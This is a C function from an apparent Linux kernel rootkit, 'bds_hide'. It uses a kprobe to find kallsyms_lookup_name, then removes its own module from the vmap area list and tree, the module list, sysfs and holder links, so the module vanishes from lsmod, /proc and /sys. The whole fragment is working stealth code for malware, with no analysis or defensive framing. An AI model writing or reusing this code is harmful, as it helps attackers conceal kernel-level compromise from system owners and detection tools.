static void bds_hide(void) {
	struct vmap_area *va, *vtmp;
	struct module_use *use, *tmp;
	struct list_head *_vmap_area_list;
	struct rb_root *_vmap_area_root;

	#ifdef KPROBE_LOOKUP
		unsigned long (*kallsyms_lookup_name)(const char *name);
		if (register_kprobe(&kp) < 0)
			return;
		kallsyms_lookup_name = (unsigned long (*)(const char *name)) kp.addr;
		unregister_kprobe(&kp);
	#endif
	
	_vmap_area_list = (struct list_head *) kallsyms_lookup_name("vmap_area_list");
	_vmap_area_root = (struct rb_root *) kallsyms_lookup_name("vmap_area_root");
	list_for_each_entry_safe (va, vtmp, _vmap_area_list, list) {
		if ((unsigned long) THIS_MODULE > va->va_start &&
			(unsigned long) THIS_MODULE < va->va_end) {
			list_del(&va->list);
			rb_erase(&va->rb_node, _vmap_area_root);
		}
	}
	list_del_init(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_for_each_entry_safe (use, tmp, &THIS_MODULE->target_list, target_list) {
		list_del(&use->source_list);
		list_del(&use->target_list);
		sysfs_remove_link(use->target->holders_dir, THIS_MODULE->name);
		kfree(use);
	}
}
